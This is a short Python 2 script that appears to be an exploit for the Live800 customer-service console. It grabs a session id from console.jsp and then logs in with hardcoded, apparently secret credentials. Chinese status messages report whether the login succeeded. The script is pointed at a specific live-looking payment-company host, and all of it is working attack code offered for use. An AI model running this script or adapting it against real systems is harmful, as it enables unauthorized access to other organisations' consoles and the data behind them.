#!/usr/bin/python

# -*- coding: utf-8 -*-



import requests

import sys



headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36'}



def getsessionid(url):

    url = url + "/live800/console/console.jsp"

    req = requests.get(url, allow_redirects=False)

    status = req.status_code

    #print status

    if status == 302:

        sessionid = req.headers['Set-Cookie'][11:43]

        print 'sessionid为：' + sessionid

        return  sessionid

    else:

        print '漏洞不存在！'

        return '1'



def loginin(url, sessionid):

    url = url + '/live800/console/console.jsp?login=' + sessionid

    data = {'iamkevin': 'wuxiaohong', 'companyId': '123', 'userName': 'kevin', 'password': 'wuTAO198403242337'}

    cookies = {'JSESSIONID': sessionid}

    try:

        req = requests.post(url, data=data, cookies=cookies, headers=headers, allow_redirects=False)

        if req.status_code == 302:

            print '登录成功: ' + req.headers['Location']

        else:

            print '漏洞不存在！'

    except Exception, e:

        print e



url = 'http://online.yeepay.com'

se = getsessionid(url)

loginin(url, se)